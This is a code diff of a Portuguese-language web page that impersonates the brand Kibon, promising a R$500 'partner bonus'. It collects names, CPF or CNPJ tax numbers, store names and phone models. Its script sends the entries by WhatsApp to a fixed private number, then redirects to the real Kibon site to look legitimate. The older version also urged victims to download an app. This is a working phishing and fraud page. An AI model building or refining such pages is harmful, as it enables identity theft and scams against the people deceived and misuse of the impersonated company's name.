@@ -3,232 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kibon - Portal do Parceiro</title>
+    <title>Kibon - Cadastro Oficial</title>
     <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        /* IDENTIDADE VISUAL OFICIAL KIBON */
         :root {
             --kibon-red: #E2001A;
             --kibon-yellow: #FFD700;
-            --kibon-white: #FFFFFF;
-            --bg-gray: #F4F4F4;
         }
 
         * { box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-
-        body {
-            background-color: var(--bg-gray);
-            margin: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 15px;
-        }
+        body { background-color: #f4f4f4; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 15px; }
 
         .card {
-            background: var(--kibon-white);
+            background: white;
             width: 100%;
             max-width: 480px;
             border-radius: 30px;
             box-shadow: 0 15px 35px rgba(0,0,0,0.1);
             overflow: hidden;
-            border: 2px solid #eee;
+            text-align: center;
         }
 
-        /* Banner Superior com Amarelo Kibon */
+        .header { padding: 30px 20px 10px; }
+
+        /* ESTILO DA IMAGEM */
+        .logo-container {
+            min-height: 80px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+        }
+
+        .logo-kibon {
+            width: 180px;
+            height: auto;
+            display: block;
+        }
+
+        /* Caso a imagem falhe, este estilo manterá o aspeto profissional */
+        .logo-kibon[alt]:after {
+            content: "KIBON";
+            display: block;
+            font-size: 30px;
+            font-weight: 900;
+            color: var(--kibon-red);
+        }
+
         .bonus-banner {
             background: var(--kibon-yellow);
             color: var(--kibon-red);
-            text-align: center;
             padding: 12px;
             font-weight: 800;
             font-size: 14px;
             text-transform: uppercase;
-            border-bottom: 3px solid var(--kibon-red);
         }
 
-        .header {
-            padding: 30px 20px 10px;
-            text-align: center;
-        }
+        h1 { font-size: 22px; color: var(--kibon-red); margin: 15px 0; font-weight: 800; }
 
-        /* Logo oficial */
-        .logo-kibon {
-            width: 160px;
-            height: auto;
-            margin-bottom: 10px;
-        }
-
-        .header h1 {
-            font-size: 24px;
-            color: var(--kibon-red);
-            margin: 10px 0;
-            font-weight: 800;
-        }
-
-        .form-body { padding: 0 25px 30px; }
-
+        .form-body { padding: 0 25px 30px; text-align: left; }
         .input-group { margin-bottom: 12px; }
-
-        label {
-            display: block;
-            font-size: 11px;
-            font-weight: 700;
-            color: #666;
-            margin-bottom: 4px;
-            text-transform: uppercase;
-        }
-
+        label { display: block; font-size: 11px; font-weight: 700; color: #666; margin-bottom: 4px; text-transform: uppercase; }
         input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 2px solid #f0f0f0;
-            border-radius: 15px;
-            font-size: 14px;
-            background: #fafafa;
-            outline: none;
-            transition: 0.3s;
+            width: 100%; padding: 12px; border: 2px solid #f0f0f0; border-radius: 15px;
+            font-size: 14px; outline: none; transition: 0.3s;
         }
+        input:focus { border-color: var(--kibon-red); }
 
-        input:focus {
-            border-color: var(--kibon-red);
-            background: #fff;
-        }
-
-        .bonus-box {
-            background: #FFF9F0;
-            border: 2px solid var(--kibon-yellow);
-            border-radius: 20px;
-            padding: 15px;
-            margin: 20px 0;
-            text-align: center;
-        }
-
-        .bonus-box p { margin: 0; font-size: 13px; color: #444; }
-        .bonus-box b { 
-            color: var(--kibon-red); 
-            font-size: 20px; 
-            display: block;
-            margin-top: 5px;
-        }
-
-        /* Botão Vermelho Kibon Oficial */
         .btn-kibon {
-            width: 100%;
-            padding: 18px;
-            background: var(--kibon-red);
-            color: white;
-            border: none;
-            border-radius: 50px; /* Botão bem arredondado como a marca */
-            font-size: 16px;
-            font-weight: 800;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 6px 15px rgba(226, 0, 26, 0.3);
+            width: 100%; padding: 18px; background: var(--kibon-red); color: white;
+            border: none; border-radius: 50px; font-size: 16px; font-weight: 800;
+            cursor: pointer; transition: 0.3s; margin-top: 20px;
         }
-
-        .btn-kibon:hover {
-            background: #c10016;
-            transform: scale(1.02);
-        }
-
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 10px;
-            color: #aaa;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
+        .btn-kibon:hover { transform: scale(1.02); background: #c10016; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="bonus-banner">🎁 SALDO EXCLUSIVO DE R$ 500,00 DISPONÍVEL</div>
+    <div class="bonus-banner">🎁 BÔNUS DE R$ 500,00 ATIVO</div>
     
     <div class="header">
-        <img src="https://logodownload.org/wp-content/uploads/2017/05/kibon-logo-1.png" alt="Kibon" class="logo-kibon">
-        <h1>Seja um Parceiro</h1>
+        <div class="logo-container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/63/Kibon_logo.svg/1024px-Kibon_logo.svg.png" 
+                 alt="Logo Kibon" 
+                 class="logo-kibon"
+                 onerror="this.src='https://logodownload.org/wp-content/uploads/2017/05/kibon-logo-1.png'">
+        </div>
+        <h1>Portal do Parceiro</h1>
     </div>
 
     <form class="form-body">
         <div class="input-group">
-            <label>Nome do Responsável</label>
-            <input type="text" id="nome" placeholder="Seu nome completo">
+            <label>Nome Completo</label>
+            <input type="text" id="nome" placeholder="Seu nome">
         </div>
-
         <div class="input-group">
             <label>CPF ou CNPJ</label>
-            <input type="text" id="documento" placeholder="000.000.000-00">
+            <input type="text" id="doc" placeholder="000.000.000-00">
         </div>
-
         <div class="input-group">
             <label>Nome do Comércio</label>
-            <input type="text" id="comercio" placeholder="Nome da Loja">
+            <input type="text" id="loja" placeholder="Nome da Loja">
         </div>
-
-        <div style="display: flex; gap: 10px;">
-            <div style="flex: 2;">
-                <label>Cidade</label>
-                <input type="text" id="cidade" placeholder="Cidade">
-            </div>
-            <div style="flex: 1;">
-                <label>UF</label>
-                <input type="text" id="estado" maxlength="2" placeholder="Ex: RS">
-            </div>
-        </div>
-
         <div class="input-group">
             <label>Modelo do Celular</label>
-            <input type="text" id="aparelho" placeholder="Ex: iPhone, Samsung S23">
+            <input type="text" id="cel" placeholder="Ex: iPhone 15">
         </div>
 
-        <div class="bonus-box">
-            <p>Após o cadastro, baixe o app e ganhe:</p>
-            <b>R$ 500,00 DE BÔNUS</b>
-        </div>
-
-        <button type="button" class="btn-kibon" onclick="finalizarCadastro()">CONCLUIR E RESGATAR</button>
+        <button type="button" class="btn-kibon" onclick="enviar()">CADASTRAR E RECEBER</button>
     </form>
-
-    <div class="footer">© 2026 Kibon Brasil - Distribuição Autorizada</div>
 </div>
 
 <script>
-    function finalizarCadastro() {
-        const fone = "5554999422678";
-        const linkApp = "https://www.kibon.com.br"; // Link oficial
-
-        const campos = {
-            nome: document.getElementById('nome').value,
-            doc: document.getElementById('documento').value,
-            loja: document.getElementById('comercio').value,
-            cid: document.getElementById('cidade').value,
-            uf: document.getElementById('estado').value,
-            cel: document.getElementById('aparelho').value
-        };
-
-        if(Object.values(campos).some(v => v === "")) {
-            alert("Por favor, preencha todos os campos da Kibon!");
-            return;
-        }
-
-        const msg = `*CADASTRO OFICIAL KIBON*%0A` +
-                    `----------------------------%0A` +
-                    `👤 *Titular:* ${campos.nome}%0A` +
-                    `📄 *Doc:* ${campos.doc}%0A` +
-                    `🏪 *Loja:* ${campos.loja}%0A` +
-                    `📍 *Local:* ${campos.cid}-${campos.uf}%0A` +
-                    `📱 *Celular:* ${campos.cel}%0A` +
-                    `----------------------------%0A` +
-                    `*RESERVAR BÔNUS DE R$ 500*`;
-
-        window.open(`https://api.whatsapp.com/send?phone=${fone}&text=${msg}`, '_blank');
+    function enviar() {
+        const tel = "5554999422678";
+        const nome = document.getElementById('nome').value;
+        const msg = `*CADASTRO KIBON*%0A*Nome:* ${nome}%0A*Solicito bônus de R$ 500*`;
         
-        alert("Parabéns! Cadastro enviado. Baixe o aplicativo agora para ativar seu bônus.");
-        window.location.href = linkApp;
+        if(!nome) { alert("Preencha os campos!"); return; }
+
+        window.open(`https://api.whatsapp.com/send?phone=${tel}&text=${msg}`, '_blank');
+        window.location.href = "https://www.kibon.com.br";
     }
 </script>
 
